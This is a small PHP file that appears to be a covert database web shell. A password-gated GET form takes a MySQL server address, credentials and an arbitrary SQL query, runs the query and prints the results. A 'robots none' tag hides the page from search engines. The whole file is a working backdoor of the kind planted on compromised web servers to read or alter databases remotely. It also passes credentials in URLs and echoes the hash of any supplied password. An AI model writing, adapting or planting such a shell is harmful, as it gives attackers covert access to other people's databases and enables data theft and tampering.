<?php

$pas="52a29501b93c843f68cc1b62b6032fec5b3d6ec2b140232a6664d0a34163e7be";
$output=null;

?>

<!DOCTYPE html>
<html>
 <head>
  <meta name="robots" content="none">
 </head>
 <body bgcolor=#212121 text=#FFFFFF leftmargin=50>
  <code>	
   <div>
    <?php echo hash('sha256',$_GET['pas']); ?>
   </div>
   <form method="get">
    <p>
     <div>
      <label for=srv>server: </label>  
      <input id=srv type="text" size=40 value="<?php echo htmlspecialchars($_GET['srv']); ?>" name="srv">
     </div>
     <div>
      <label for=usr>usernm: </label>  
      <input id=usr type="text" size=40 value="<?php echo htmlspecialchars($_GET['usr']); ?>" name="usr">
     </div>
     <div>
      <label for=sqp>sqlpas: </label>  
      <input id=sqp type="text" size=40 value="<?php echo htmlspecialchars($_GET['sqp']); ?>" name="sqp">
     </div>
    </p>
    <p>
     <div>
      <label for=pas>passwd: </label>
      <input id=pas type="text" size=80 value="<?php echo htmlspecialchars($_GET['pas']); ?>" name="pas">
     </div>
     <div>
      <label for=cmd>query : </label>  
      <input id=cmd type="text" size=80 value="<?php echo htmlspecialchars($_GET['cmd']); ?>" name="cmd">
     </div>
     <div>
      <input type="submit">
     </div>
    </p>
   </form>
   <hr align=left width=732>
   <p> 

<?php
if(hash('sha256',$_GET['pas'])==$pas && isset($_GET['cmd'])) {
	$link=mysql_connect($_GET['srv'],$_GET['usr'],$_GET['sqp']);
	$output=mysql_query($_GET['cmd'], $link);
	mysql_close($link);
}

while($row = mysql_fetch_assoc($output)){
	echo htmlspecialchars(implode("|",$row)), "<br>";
}

?>
  </p>
  </code>
 </body>
</html>